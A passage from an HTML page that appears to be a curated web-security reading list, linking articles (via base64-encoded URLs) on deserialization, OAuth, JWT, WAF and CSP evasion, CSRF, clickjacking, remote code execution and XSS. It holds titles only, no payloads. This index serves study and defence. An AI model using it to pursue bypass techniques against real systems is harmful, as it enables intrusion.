data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9icmVlbm1hY2hpbmU=\">@breenmachine</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0l2YW4xZWUvTkVULURlc2VyaWFsaXpl\">总结了十篇.Net 反序列化文章，持续更新</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0l2YW4xZWU=\">@Ivan1ee</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1lRGZHcHUzaUU0UQ==\">Attacking .NET deserialization</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9wd250ZXN0ZXI=\">@pwntester</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj0tLTZQaXV2QkdBVQ==\">.NET Roulette: Exploiting Insecure Deserialization in Telerik UI</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ub3BlcmF0b3I=\">@noperator</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9ibG9nL2V4cGxvaXQtZG90bmV0bnVrZS1jb29raWUtZGVzZXJpYWxpemF0aW9uLw==\">How to exploit the DotNetNuke Cookie Deserialization</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9ibG9nL2F1dGhvci9wZW50ZXN0LWNyaXN0aWFuLw==\">CRISTIAN CORNEA</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9lbi9wdWJsaWNhdGlvbnMvaG93LXRvLWV4cGxvaXQtbGlmZXJheS1jdmUtMjAyMC03OTYxLXF1aWNrLWpvdXJuZXktdG8tcG9jLmh0bWw=\">HOW TO EXPLOIT LIFERAY CVE-2020-7961 : QUICK JOURNEY TO POC</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zeW5hY2t0aXY=\">@synacktiv</span>.</li>\n</ul>\n<p><a name=\"oauth\"></a></p>\n<h3 id=\"oauth\"><a class=\"anchor\" href=\"#oauth\">#</a> OAuth</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcmFnbWF0aWN3ZWJzZWN1cml0eS5jb20vY291cnNlcy9pbnRyb2R1Y3Rpb24tb2F1dGgtb2lkYy5odG1s\">Introduction to OAuth 2.0 and OpenID Connect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9QaGlsaXBwZURlUnljaw==\">@PhilippeDeRyck</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY3VyaW5nL3doYXQtaXMtZ29pbmctb24td2l0aC1vYXV0aC0yLTAtYW5kLXdoeS15b3Utc2hvdWxkLW5vdC11c2UtaXQtZm9yLWF1dGhlbnRpY2F0aW9uLTVmNDc1OTdiMjYxMQ==\">What is going on with OAuth 2.0? And why you should not use it for authentication.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkYW1pYW5ydXNpbmVr\">@damianrusinek</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BqdXN0aW5sZWVfNzg1NjMvJUU5JTk3JTlDJUU2JTk2JUJDb2F1dGgtMi0wLSVFNCVCQiVBNWZhY2Vib29rJUU3JTgyJUJBJUU0JUJFJThCLTZmNzhhNGE1NWY1Mg==\">關於 OAuth 2.0 - 以 Facebook 為例</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BqdXN0aW5sZWVfNzg1NjM=\">@justinlee_78563</span>.</li>\n</ul>\n<p><a name=\"jwt\"></a></p>\n<h3 id=\"jwt\"><a class=\"anchor\" href=\"#jwt\">#</a> JWT</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yMmMuZGV2L2Jsb2cvMjAyMC9oYXJkY29kZWQtc2VjcmV0cy11bnZlcmlmaWVkLXRva2Vucy1hbmQtb3RoZXItY29tbW9uLWp3dC1taXN0YWtlcy8=\">Hardcoded secrets, unverified tokens, and other common JWT mistakes</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lcm1pbDB2\">@ermil0v</span>.</li>\n</ul>\n<h2 id=\"evasions\"><a class=\"anchor\" href=\"#evasions\">#</a> Evasions</h2>\n<p><a name=\"evasions-xxe\"></a></p>\n<h3 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TcGlkZXJTZWMvc3RhdHVzLzExOTEzNzU0NzI2OTA1MjgyNTY=\">Bypass Fix of OOB XXE Using Different encoding</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TcGlkZXJTZWM=\">@SpiderSec</span>.</li>\n</ul>\n<p><a name=\"evasions-csp\"></a></p>\n<h3 id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> CSP</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3czYy93ZWJhcHBzZWMtY3NwL2lzc3Vlcy8yNDM=\">Any protection against dynamic module import?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Ac2hobmpr\">@shhnjk</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20vMjAxNi8wNC8wNC9jc3AtYnlwYXNzaW5nLWZvcm0tYWN0aW9uLXdpdGgtcmVmbGVjdGVkLXhzcy8=\">CSP: bypassing form-action with reflected XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20v\">Detectify Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLzIwMTcvMDUvdHdpdHRlci14c3MtY3NwLWJ5cGFzcy5odG1s\">TWITTER XSS + CSP BYPASS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLw==\">Paulos Yibelo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWIud2FsbGFybS5jb20vaG93LXRvLXRyaWNrLWNzcC1pbi1sZXR0aW5nLXlvdS1ydW4td2hhdGV2ZXIteW91LXdhbnQtNzNjYjVmZjQyOGFh\">Neatly bypassing CSP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ldmFkaW5nLWNzcC13aXRoLWRvbS1iYXNlZC1kYW5nbGluZy1tYXJrdXA=\">Evading CSP with DOM-based dangling markup</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1jc3Atam91cm5leS8=\">GitHub's CSP journey</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B0b29tZXkz\">@ptoomey3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1wb3N0LWNzcC1qb3VybmV5Lw==\">GitHub's post-CSP journey</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B0b29tZXkz\">@ptoomey3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2hlYXJ0c2t5LmluZm8vMjAxNy8wMy8wMy8lRTklODIlQTMlRTQlQkElOUIlRTUlQjklQjQlRTYlODglOTElRTQlQkIlQUMlRTclQkIlOTUlRTglQkYlODclRTclOUElODRDU1A=\">那些年我们绕过的 CSP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2hlYXJ0c2t5LmluZm8v\">HeartSky</span>.</li>\n</ul>\n<p><a name=\"evasions-waf\"></a></p>\n<h3 id=\"waf\"><a class=\"anchor\" href=\"#waf\">#</a> WAF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3dhZi1ldmFzaW9uLXRlY2huaXF1ZXMtNzE4MDI2ZDY5M2Q4\">Web Application Firewall (WAF) Evasion Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWNqdWljZQ==\">@secjuice</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3dlYi1hcHBsaWNhdGlvbi1maXJld2FsbC13YWYtZXZhc2lvbi10ZWNobmlxdWVzLTItMTI1OTk1ZjNlN2Iw\">Web Application Firewall (WAF) Evasion Techniques #2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWNqdWljZQ==\">@secjuice</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFuemhpLmFsaXl1bi5jb20vZm9ydW0vcmVhZC81NTMuaHRtbA==\">浅谈 json 参数解析对 waf 绕过的影响</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFuemhpLmFsaXl1bi5jb20vZm9ydW0vdS5waHA/dWlkPTE3MjM4OTU3Mzc1MzE0Mzc=\">doggy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWVyLmhhdXMvMjAxNy8wMy8wOC9haXJibmItd2hlbi1ieXBhc3NpbmctanNvbi1lbmNvZGluZy14c3MtZmlsdGVyLXdhZi1jc3AtYW5kLWF1ZGl0b3ItdHVybnMtaW50by1laWdodC12dWxuZXJhYmlsaXRpZXMv\">Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9iYnVlcmhhdXM=\">@Brett Buerhaus</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkMHpucHAvaG93LXRvLWJ5cGFzcy1saWJpbmplY3Rpb24taW4tbWFueS13YWYtbmd3YWYtMWUyNTEzNDUzYzBm\">How to bypass libinjection in many WAF/NGWAF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkMHpucHA=\">@d0znpp</span>.</li>\n</ul>\n<p><a name=\"evasions-jsmvc\"></a></p>\n<h3 id=\"jsmvc\"><a class=\"anchor\" href=\"#jsmvc\">#</a> JSMVC</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpby9qc212Y29tZmctdG8tc3Rlcm5seS1sb29rLWF0LWphdmFzY3JpcHQtbXZjLWFuZC10ZW1wbGF0aW5nLWZyYW1ld29ya3M=\">JavaScript MVC and Templating Frameworks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n</ul>\n<p><a name=\"evasions-authentication\"></a></p>\n<h3 id=\"authentication\"><a class=\"anchor\" href=\"#authentication\">#</a> Authentication</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubWFsZXJpc2NoLm5ldC8yMDE3LzA0L3RyZW5kLW1pY3JvLXRocmVhdC1kaXNjb3ZlcnktYXBwbGlhbmNlLXNlc3Npb24tZ2VuZXJhdGlvbi1hdXRoZW50aWNhdGlvbi1ieXBhc3MtY3ZlLTIwMTYtODU4NC5odG1s\">Trend Micro Threat Discovery Appliance - Session Generation Authentication Bypass (CVE-2016-8584)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYWxlcmlzY2g=\">@malerisch</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdGV2ZW50c2VlbGV5\">@steventseeley</span>.</li>\n</ul>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<p><a name=\"tricks-csrf\"></a></p>\n<h3 id=\"csrf\"><a class=\"anchor\" href=\"#csrf\">#</a> CSRF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMjcxNjE4MQ==\">Neat tricks to bypass CSRF-protection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d29zZWN1cml0eS5pby8=\">Twosecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9leHBsb2l0aW5nLWNzcmYtb24tanNvbi1lbmRwb2ludHMtd2l0aC1mbGFzaC1hbmQtcmVkaXJlY3RzLTY4MWQ0YWQ2YjMxYg==\">Exploiting CSRF on JSON endpoints with Flash and redirects</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9Acml5YXp3YWxpa2Fy\">@riyazwalikar</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R4YTQ0ODEvY3NzSW5qZWN0aW9u\">Stealing CSRF tokens with CSS injection (without iFrames)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R4YTQ0ODE=\">@dxa4481</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNlY3VyaXR5ZXZhbHVhdG9ycy5jb20vY3JhY2tpbmctamF2YXMtcm5nLWZvci1jc3JmLWVhOWNhY2QyMzFkMg==\">Cracking Java’s RNG for CSRF - Javax Faces and Why CSRF Token Randomness Matters</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNlY3VyaXR5ZXZhbHVhdG9ycy5jb20vQHJyYW1nYXR0aWU=\">@rramgattie</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BfZ3JhcGh4L2lmLWh0dHBvbmx5LXlvdS1jb3VsZC1zdGlsbC1jc3JmLW9mLWNvcnMteW91LWNhbi01ZDdlZTJjNzQ0Mw==\">If HttpOnly You Could Still CSRF… Of CORS you can!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9HcmFwaFg=\">@GraphX</span>.</li>\n</ul>\n<p><a name=\"tricks-clickjacking\"></a></p>\n<h3 id=\"clickjacking-2\"><a class=\"anchor\" href=\"#clickjacking-2\">#</a> Clickjacking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYXVzaGFucmFqXzY1MDM5L2dvb2dsZS1jbGlja2phY2tpbmctNmEwNDEzMmI5MThh\">Clickjackings in Google worth 14981.7$</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYXVzaGFucmFqXzY1MDM5\">@raushanraj_65039</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vcDgzNjEvYnVnLWJvdW50eS1qaWFuZy1qaW4tbGllLXJlbi1nYW4ta3UtdGFuLW5hLXhpZS1uaWFuLXdvLWh1aS1iYW8tZ3VvLWRlLWxvdS1kb25n\">Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n</ul>\n<p><a name=\"tricks-rce\"></a></p>\n<h3 id=\"remote-code-execution\"><a class=\"anchor\" href=\"#remote-code-execution\">#</a> Remote Code Execution</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGhlemRpLmNvbS9ibG9nLzIwMTkvMTAvMjMvY3ZlLTIwMTktMTMwNi1hcmUteW91LW15LWluZGV4\">CVE-2019-1306: ARE YOU MY INDEX?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS95dTVrMw==\">@yu5k3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzkwOS8=\">WebLogic RCE (CVE-2019-2725) 漏洞之旅</span> - Written by Badcode@知道创宇 404 实验室.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4NC8=\">Weblogic 反序列化漏洞 (CVE-2018-2628) 漫谈</span> - Written by Badcode@知道创宇 404 实验室.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3hnbG92ZXNlY3VyaXR5LmNvbS8yMDE1LzExLzA2L3doYXQtZG8td2VibG9naWMtd2Vic3BoZXJlLWpib3NzLWplbmtpbnMtb3Blbm5tcy1hbmQteW91ci1hcHBsaWNhdGlvbi1oYXZlLWluLWNvbW1vbi10aGlzLXZ1bG5lcmFiaWxpdHkv\">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AYnJlZW5tYWNoaW5l\">@breenmachine</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v\">Exploiting Node.js deserialization bug for Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC9hdXRob3IvYWppbmFicmFoYW0v\">OpSecX</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEhQL2J5cGFzcy1ldmFsLWxlbmd0aC1yZXN0cmljdC5odG1s\">eval 长度限制绕过 &amp;&amp; PHP5.6 新特性</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzEyMjkzOC5odG1s\">PHP 垃圾回收机制 UAF 漏洞分析</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvcGgxcmU=\">ph1re</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1iaW9uaWNzLmlvL2Jsb2cvZHJ1cGFsLXNlcnZpY2VzLW1vZHVsZS1yY2U=\">DRUPAL 7.X SERVICES MODULE UNSERIALIZE() TO RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1iaW9uaWNzLmlvLw==\">Ambionics Security</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYXBhY2l0b3JzZXQuZ2l0aHViLmlvL21hdGhqcy8=\">How we exploited a remote code execution vulnerability in math.js</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NhcGFjaXRvcnNldA==\">@capacitorset</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2V4YWJsdWUuZGUvYmxvZy8yMDE3LTAzLTE1LWdpdGh1Yi1lbnRlcnByaXNlLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi5odG1s\">GitHub Enterprise Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2libHVl\">@iblue</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS8yMDE4L21vb2RsZS1yZW1vdGUtY29kZS1leGVjdXRpb24v\">Evil Teacher: Code Injection in Moodle</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmlwc3RlY2guY29tLw==\">RIPS Technologies</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTcvMDcvaG93LWktY2hhaW5lZC00LXZ1bG5lcmFiaWxpdGllcy1vbi5odG1s\">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLy0zNmstZ29vZ2xlLWFwcC1lbmdpbmUtcmNl\">$36k Google App Engine RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvdGVzdHNpdGVoYWNraW5nLw==\">Ezequiel Pereira</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2Rld2hpdGVzZWMuYmxvZ3Nwb3QuY29tLzIwMTgvMDUvcG9vci1yaWNoZmFjZXMuaHRtbA==\">Poor RichFaces</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29kZS13aGl0ZS5jb20v\">CODE WHITE</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNjcnQuY2gvMjAxOC8wOC8yNC9yZW1vdGUtY29kZS1leGVjdXRpb24tb24tYS1mYWNlYm9vay1zZXJ2ZXIv\">Remote Code Execution on a Facebook server</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ibGFrbGlzXw==\">@blaklis_</span>.</li>\n</ul>\n<p><a name=\"tricks-xss\"></a></p>\n<h3 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby9wb3N0cy8yMDE5LzExLzMwL1hTU18yMF9jaGFyYWN0ZXJzLmh0bWw=\">Exploiting XSS with 20 characters limitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby8=\">Jorge Lajara</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFod3VsLmNvbS8yMDE5LzExL3VwZ3JhZGUtc2VsZi14c3MtdG8tZXhwbG9pdGFibGUteHNzLmh0bWw=\">Upgrade self XSS to Exploitable XSS an 3 Ways Technic</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFod3VsLmNvbS8=\">HAHWUL</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy94c3Mtd2l0aG91dC1wYXJlbnRoZXNlcy1hbmQtc2VtaS1jb2xvbnM=\">XSS without parentheses and semi-colons</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2J1Z2JvdW50eXdyaXRldXAveHNzLWF1ZGl0b3ItdGhlLXByb3RlY3Rvci1vZi11bnByb3RlY3RlZC1mOTAwYTVlMTViN2I=\">XSS-Auditor — the protector of unprotected and the deceiver of protected.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0ZXJqYW5x\">@terjanq</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMjkzNjg5\">Query parameter reordering causes redirect page to render unsafe URL</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2tlbnppeQ==\">kenziy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpby9lczYtZW4=\">ECMAScript 6 from an Attacker's Perspective - Breaking Frameworks, Sandboxes, and everything else</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXJpbl9tL2hvdy1pLWZvdW5kLWEtNS0wMDAtZ29vZ2xlLW1hcHMteHNzLWJ5LWZpZGRsaW5nLXdpdGgtcHJvdG9idWYtOTYzZWUwZDljYWZmIy51NTBucnpoYXM=\">How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXJpbl9t\">@marin_m</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctTGVraWVzLURvbnQtVHJ1c3QtVGhlLURPTS1CeXBhc3NpbmctWFNTLU1pdGlnYXRpb25zLVZpYS1TY3JpcHQtR2FkZ2V0cy5wZGY=\">DON'T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zbGVraWVz\">Sebastian Lekies</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ra290b3dpY3o=\">Krzysztof Kotowicz</span>, and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaXJkYXJja2NhdA==\">Eduardo Vela</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3poY2hiaW4uZ2l0aHViLmlvLzIwMTcvMDgvMzAvVWJlci1YU1MtdmlhLUNvb2tpZS8=\">Uber XSS via Cookie</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3poY2hiaW4uZ2l0aHViLmlvLw==\">zhchbin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N0YW1vbmUtYnVnLWJvdW50eS5ibG9nc3BvdC50dy8yMDE3LzEwL2RvbS14c3MtYXV0aDE0Lmh0bWw=\">DOM XSS – auth.uber.com</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3N0YW1vbmUtYnVnLWJvdW50eS5ibG9nc3BvdC50dy8=\">StamOne_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLzIwMTgvMDMvc3RvcmVkLXhzcy1vbi1mYWNlYm9vay8=\">Stored XSS on Facebook</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">Enguerran Gillier</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA2L3hzcy1pbi1nb29nbGUtY29sYWJvcmF0b3J5LWNzcC1ieXBhc3MuaHRtbA==\">XSS in Google Colaboratory + CSP bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA5L2Fub3RoZXIteHNzLWluLWdvb2dsZS1jb2xhYm9yYXRvcnkuaHRtbA==\">Another XSS in Google Colaboratory</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><a href=\"https://twitter.com/strukt93/status/931586377665331200\"></script> is filtered ?</a> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdHJ1a3Q5Mw==\">@strukt93</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aW5vdGhrdW1hci5tZS8yMDAwMC1mYWNlYm9vay1kb20teHNzLw==\">$20000 Facebook DOM XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS92aW5vZHNwYXJyb3c=\">@vinodsparrow</span>.</li>\n</ul>\n<p><a name=\"tricks-sql-injection\"></a></p>\n<h3 id=\"sql-injection-2\"><a class=\"anchor\" href=\"#sql-injection-2\">#</a> SQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qaW5nbGluZ3NodS5vcmcvP3A9MjIyMA==\">屌智硬之 mysql 不用逗号注入</span> - Written by <span class=\"exturl\" 